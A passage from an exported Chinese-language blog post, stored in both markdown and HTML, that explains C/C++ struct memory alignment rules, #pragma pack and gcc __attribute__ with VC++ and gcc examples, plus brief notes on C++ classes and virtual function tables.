可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行**取指，译码，执行等**操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地\"串并联\"起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的\"1\"和\"0\"．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎`磕碜`的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)\n\n### 3. Win栗子如下：\n#### 1. 这是以前我用Win的时候VC++ 6.0编译器的效果图\n![配置](/images/1.png)\n#### 2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\n![int b](/images/2.png)\n#### 3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取\n![整数倍](/images/3.png)\n#### 4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\n![数组](/images/4.png)\n#### 5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)\n![char](/images/5.png)\n#### 6. 说明#pragma pack (n) n非2的幂的值时候无效\n![#pragma pack (n)](/images/6.png)\n#### 7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\n![struct](/images/7.png)\n#### 8. 说明pragma pack (3)没作用\n![pack (3)](/images/8.png)\n\n### 4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：\n#### 1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:\n![gcc -v](/images/gcc-st-1.png)\n#### 2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\n![4 butys](/images/gcc-st-2.png)\n#### 3. 在gcc中加入功能和pragma pack差不多的__attribute__选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了...\n![attri_1](/images/gcc-st-3.png)\n#### 4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，__attribute__干得好事~\n![attri_2](/images/gcc-st-4.png)\n#### 5. 证明了有pack为1的地方必定不留一点空隙~~~\n![pack_1](/images/gcc-st-5.png)\n#### 6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\n![st_to_st](/images/gcc-st-6.png)\n#### 7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\n![st_to_aligned(1)](/images/gcc-st-7.png)\n### 5. C++中的高级之处\n> 至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的**封装**程度已经快到了`说话编程`的地步了．重复造轮子有必要吗？珍爱生命，快用py？  \n\n#### 1.C++中的结构体和类的区别？\n根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题[链接](http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang).因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为`高低电平`或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干~_~(当然这是intel 8086时代，从286开始就开始了保护模式).\n\n#### 2. C++中class的虚函数\nC++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(`obj.func(a, b, c);`)在编译器翻译的汇编代码里面等价于(`func(&obj, a, b, c);`),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊....\n\n---\n先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧~_~\n","source":"_posts/memory-align.md","raw":"---\ntitle: memory_align\ndate: 2016-08-21 21:24:53\ncategories:\n- study\ntags: \n- C/C++\n---\n\n\n## 关于C/C++中结构体(类)内存对齐问题  \n\n---\n\n> 各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛[stackoverflow](http://stackoverflow.com/ \"Stack Overflow\")等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．\n\n---\n可参考资料：  \n[维基百科](https://en.wikipedia.org/wiki/Data_structure_alignment#Problems \"维基百科\")\n[StackOverflow GCC Structure](http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs)\n[GCC文档](https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html)\n### 1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:  \n#### 32位编译器：\n      char ：1个字节\n      char*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）\n      short int : 2个字节\n      int：  4个字节\n      unsigned int : 4个字节\n      float:  4个字节\n      double:   8个字节\n      long:   4个字节\n      long long:  8个字节\n      unsigned long:  4个字节\n#### 64位编译器：\n      char ：1个字节\n      char* (即指针变量): 8个字节\n      short int : 2个字节\n      int：  4个字节\n      unsigned int : 4个字节\n      float:  4个字节\n      double:   8个字节\n      long:   8个字节\n      long long:  8个字节\n      unsigned long:  8个字节  \n其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．\n\n---\n\n### 2. 变量排放规则(自己的见解)  \n#### 1. 内置类型对象(如char<1字节>、int<现代PC编译器普遍为4字节>等)的**对齐起始地址**为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.  \n#### 2. 整个结构体或者类的**大小**为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。  \n\n> 可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行**取指，译码，执行等**操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地\"串并联\"起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的\"1\"和\"0\"．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎`磕碜`的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)\n\n### 3. Win栗子如下：\n#### 1. 这是以前我用Win的时候VC++ 6.0编译器的效果图\n![配置](/images/1.png)\n#### 2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\n![int b](/images/2.png)\n#### 3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取\n![整数倍](/images/3.png)\n#### 4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\n![数组](/images/4.png)\n#### 5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)\n![char](/images/5.png)\n#### 6. 说明#pragma pack (n) n非2的幂的值时候无效\n![#pragma pack (n)](/images/6.png)\n#### 7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\n![struct](/images/7.png)\n#### 8. 说明pragma pack (3)没作用\n![pack (3)](/images/8.png)\n\n### 4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：\n#### 1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:\n![gcc -v](/images/gcc-st-1.png)\n#### 2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\n![4 butys](/images/gcc-st-2.png)\n#### 3. 在gcc中加入功能和pragma pack差不多的__attribute__选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了...\n![attri_1](/images/gcc-st-3.png)\n#### 4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，__attribute__干得好事~\n![attri_2](/images/gcc-st-4.png)\n#### 5. 证明了有pack为1的地方必定不留一点空隙~~~\n![pack_1](/images/gcc-st-5.png)\n#### 6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\n![st_to_st](/images/gcc-st-6.png)\n#### 7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\n![st_to_aligned(1)](/images/gcc-st-7.png)\n### 5. C++中的高级之处\n> 至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的**封装**程度已经快到了`说话编程`的地步了．重复造轮子有必要吗？珍爱生命，快用py？  \n\n#### 1.C++中的结构体和类的区别？\n根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题[链接](http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang).因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为`高低电平`或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干~_~(当然这是intel 8086时代，从286开始就开始了保护模式).\n\n#### 2. C++中class的虚函数\nC++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(`obj.func(a, b, c);`)在编译器翻译的汇编代码里面等价于(`func(&obj, a, b, c);`),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊....\n\n---\n先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧~_~\n","slug":"memory-align","published":1,"updated":"2016-09-12T10:36:41.897Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuteb7ou0005r1m1iwpvy6nx","content":"<h2 id=\"关于C-C-中结构体-类-内存对齐问题\"><a href=\"#关于C-C-中结构体-类-内存对齐问题\" class=\"headerlink\" title=\"关于C/C++中结构体(类)内存对齐问题\"></a>关于C/C++中结构体(类)内存对齐问题</h2><hr>\n<blockquote>\n<p>各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛<a href=\"http://stackoverflow.com/\" title=\"Stack Overflow\" target=\"_blank\" rel=\"external\">stackoverflow</a>等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．</p>\n</blockquote>\n<hr>\n<p>可参考资料：<br><a href=\"https://en.wikipedia.org/wiki/Data_structure_alignment#Problems\" title=\"维基百科\" target=\"_blank\" rel=\"external\">维基百科</a><br><a href=\"http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs\" target=\"_blank\" rel=\"external\">StackOverflow GCC Structure</a><br><a href=\"https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html\" target=\"_blank\" rel=\"external\">GCC文档</a></p>\n<h3 id=\"1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定\"><a href=\"#1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定\" class=\"headerlink\" title=\"1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:\"></a>1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:</h3><h4 id=\"32位编译器：\"><a href=\"#32位编译器：\" class=\"headerlink\" title=\"32位编译器：\"></a>32位编译器：</h4><pre><code>char ：1个字节\nchar*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）\nshort int : 2个字节\nint：  4个字节\nunsigned int : 4个字节\nfloat:  4个字节\ndouble:   8个字节\nlong:   4个字节\nlong long:  8个字节\nunsigned long:  4个字节\n</code></pre><h4 id=\"64位编译器：\"><a href=\"#64位编译器：\" class=\"headerlink\" title=\"64位编译器：\"></a>64位编译器：</h4><pre><code>char ：1个字节\nchar* (即指针变量): 8个字节\nshort int : 2个字节\nint：  4个字节\nunsigned int : 4个字节\nfloat:  4个字节\ndouble:   8个字节\nlong:   8个字节\nlong long:  8个字节\nunsigned long:  8个字节  \n</code></pre><p>其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．</p>\n<hr>\n<h3 id=\"2-变量排放规则-自己的见解\"><a href=\"#2-变量排放规则-自己的见解\" class=\"headerlink\" title=\"2. 变量排放规则(自己的见解)\"></a>2. 变量排放规则(自己的见解)</h3><h4 id=\"1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍\"><a href=\"#1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍\" class=\"headerlink\" title=\"1. 内置类型对象(如char、int&lt;现代PC编译器普遍为4字节&gt;等)的对齐起始地址为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.\"></a>1. 内置类型对象(如char<1字节>、int&lt;现代PC编译器普遍为4字节&gt;等)的<strong>对齐起始地址</strong>为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.</1字节></h4><h4 id=\"2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\"><a href=\"#2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\" class=\"headerlink\" title=\"2. 整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\"></a>2. 整个结构体或者类的<strong>大小</strong>为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。</h4><blockquote>\n<p>可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行<strong>取指，译码，执行等</strong>操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地”串并联”起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的”1”和”0”．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎<code>磕碜</code>的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)</p>\n</blockquote>\n<h3 id=\"3-Win栗子如下：\"><a href=\"#3-Win栗子如下：\" class=\"headerlink\" title=\"3. Win栗子如下：\"></a>3. Win栗子如下：</h3><h4 id=\"1-这是以前我用Win的时候VC-6-0编译器的效果图\"><a href=\"#1-这是以前我用Win的时候VC-6-0编译器的效果图\" class=\"headerlink\" title=\"1. 这是以前我用Win的时候VC++ 6.0编译器的效果图\"></a>1. 这是以前我用Win的时候VC++ 6.0编译器的效果图</h4><p><img src=\"/images/1.png\" alt=\"配置\"></p>\n<h4 id=\"2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\"><a href=\"#2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\" class=\"headerlink\" title=\"2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\"></a>2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的</h4><p><img src=\"/images/2.png\" alt=\"int b\"></p>\n<h4 id=\"3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取\"><a href=\"#3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取\" class=\"headerlink\" title=\"3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取\"></a>3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取</h4><p><img src=\"/images/3.png\" alt=\"整数倍\"></p>\n<h4 id=\"4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\"><a href=\"#4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\" class=\"headerlink\" title=\"4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\"></a>4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小</h4><p><img src=\"/images/4.png\" alt=\"数组\"></p>\n<h4 id=\"5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊\"><a href=\"#5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊\" class=\"headerlink\" title=\"5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)\"></a>5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)</h4><p><img src=\"/images/5.png\" alt=\"char\"></p>\n<h4 id=\"6-说明-pragma-pack-n-n非2的幂的值时候无效\"><a href=\"#6-说明-pragma-pack-n-n非2的幂的值时候无效\" class=\"headerlink\" title=\"6. 说明#pragma pack (n) n非2的幂的值时候无效\"></a>6. 说明#pragma pack (n) n非2的幂的值时候无效</h4><p><img src=\"/images/6.png\" alt=\"#pragma pack (n)\"></p>\n<h4 id=\"7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\"><a href=\"#7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\" class=\"headerlink\" title=\"7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\"></a>7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数</h4><p><img src=\"/images/7.png\" alt=\"struct\"></p>\n<h4 id=\"8-说明pragma-pack-3-没作用\"><a href=\"#8-说明pragma-pack-3-没作用\" class=\"headerlink\" title=\"8. 说明pragma pack (3)没作用\"></a>8. 说明pragma pack (3)没作用</h4><p><img src=\"/images/8.png\" alt=\"pack (3)\"></p>\n<h3 id=\"4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：\"><a href=\"#4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：\" class=\"headerlink\" title=\"4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：\"></a>4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：</h3><h4 id=\"1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号\"><a href=\"#1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号\" class=\"headerlink\" title=\"1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:\"></a>1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:</h4><p><img src=\"/images/gcc-st-1.png\" alt=\"gcc -v\"></p>\n<h4 id=\"2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\"><a href=\"#2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\" class=\"headerlink\" title=\"2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\"></a>2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节</h4><p><img src=\"/images/gcc-st-2.png\" alt=\"4 butys\"></p>\n<h4 id=\"3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\"><a href=\"#3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\" class=\"headerlink\" title=\"3. 在gcc中加入功能和pragma pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\"></a>3. 在gcc中加入功能和pragma pack差不多的<strong>attribute</strong>选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…</h4><p><img src=\"/images/gcc-st-3.png\" alt=\"attri_1\"></p>\n<h4 id=\"4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事\"><a href=\"#4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事\" class=\"headerlink\" title=\"4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事~\"></a>4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，<strong>attribute</strong>干得好事~</h4><p><img src=\"/images/gcc-st-4.png\" alt=\"attri_2\"></p>\n<h4 id=\"5-证明了有pack为1的地方必定不留一点空隙\"><a href=\"#5-证明了有pack为1的地方必定不留一点空隙\" class=\"headerlink\" title=\"5. 证明了有pack为1的地方必定不留一点空隙~~~\"></a>5. 证明了有pack为1的地方必定不留一点空隙~~~</h4><p><img src=\"/images/gcc-st-5.png\" alt=\"pack_1\"></p>\n<h4 id=\"6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\"><a href=\"#6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\" class=\"headerlink\" title=\"6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\"></a>6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．</h4><p><img src=\"/images/gcc-st-6.png\" alt=\"st_to_st\"></p>\n<h4 id=\"7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\"><a href=\"#7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\" class=\"headerlink\" title=\"7. 